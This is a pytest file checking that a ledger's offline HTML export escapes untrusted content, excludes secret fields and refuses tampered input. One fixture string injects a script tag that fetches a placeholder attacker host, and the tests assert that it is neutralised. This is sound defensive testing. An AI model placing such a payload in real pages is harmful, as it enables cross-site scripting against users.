import json
import re

import pytest
from test_ledger import AUTHOR, ok_run, prereg

from rain_atlas.ledger.store import Ledger, LedgerError
from rain_atlas.observatory.export import export, snapshot


def test_offline_export_escapes_untrusted_content_and_excludes_private_fields(tmp_path, registry):
    ledger = Ledger(tmp_path / "ledger")
    exp = prereg(ledger)
    ledger.seal("private truth", {"SECRET": "NEVER-PUBLISH"})
    run = ok_run(ledger, exp)
    attack = '</script><script>fetch("https://attacker.invalid")</script> {{JS}} {{DATA}}'
    ledger.append(
        "claim",
        {
            "experiment": exp,
            "category": "COMPUTED",
            "statement": attack,
            "evidence": [run],
            "author": AUTHOR,
            "password": "DO-NOT-EXPORT",
        },
    )
    ledger.append("note", {"experiment": exp, "text": r"host C:\Users\private\secret.txt", "author": AUTHOR})
    before = ledger.log_path.read_bytes()
    path = export(ledger.root, tmp_path / "view", registry=registry)
    html = path.read_text(encoding="utf-8")
    assert "NEVER-PUBLISH" not in html and "DO-NOT-EXPORT" not in html and "Users\\\\private" not in html
    assert attack not in html and "\\u003c/script\\u003e" in html
    assert "connect-src 'none'" in html and "form-action 'none'" in html
    assert "innerHTML" not in html and "eval(" not in html
    data = json.loads(
        re.search(r'<script id="atlas-data" type="application/json">(.*?)</script>', html, re.S).group(1)
    )
    assert next(r for r in data["records"] if r["kind"] == "claim")["data"]["statement"] == attack
    assert ledger.log_path.read_bytes() == before
    assert all("unknown" in s["test_status"] for s in data["skills"])


def test_export_refuses_tamper_missing_source_and_overwrite(tmp_path):
    with pytest.raises(ValueError, match="not a ledger"):
        export(tmp_path / "no", tmp_path / "view")
    ledger = Ledger(tmp_path / "ledger")
    exp = prereg(ledger)
    export(ledger.root, tmp_path / "view")
    with pytest.raises(ValueError, match="already exists"):
        export(ledger.root, tmp_path / "view")
    with pytest.raises(ValueError, match="outside"):
        export(ledger.root, ledger.root / "view")
    ledger._object_path(exp).write_bytes(b"{}")
    with pytest.raises(LedgerError, match="refused"):
        export(ledger.root, tmp_path / "broken")
    assert not (tmp_path / "broken").exists()


def test_projection_retains_uncertainty_and_incomplete_status(tmp_path):
    ledger = Ledger(tmp_path)
    exp = prereg(ledger)
    run = ok_run(ledger, exp)
    ledger.append(
        "claim",
        {
            "experiment": exp,
            "category": "COMPUTED",
            "statement": "unknown effect",
            "value": None,
            "uncertainty": {"reason": "no truth available"},
            "unit": "Hz",
            "evidence": [run],
            "author": AUTHOR,
        },
    )
    result = snapshot(ledger)
    claim = next(r for r in result["records"] if r["kind"] == "claim")
    assert claim["data"]["value"] is None
    assert claim["data"]["uncertainty"]["reason"] == "no truth available"
    assert not any(r["kind"] == "report" for r in result["records"])
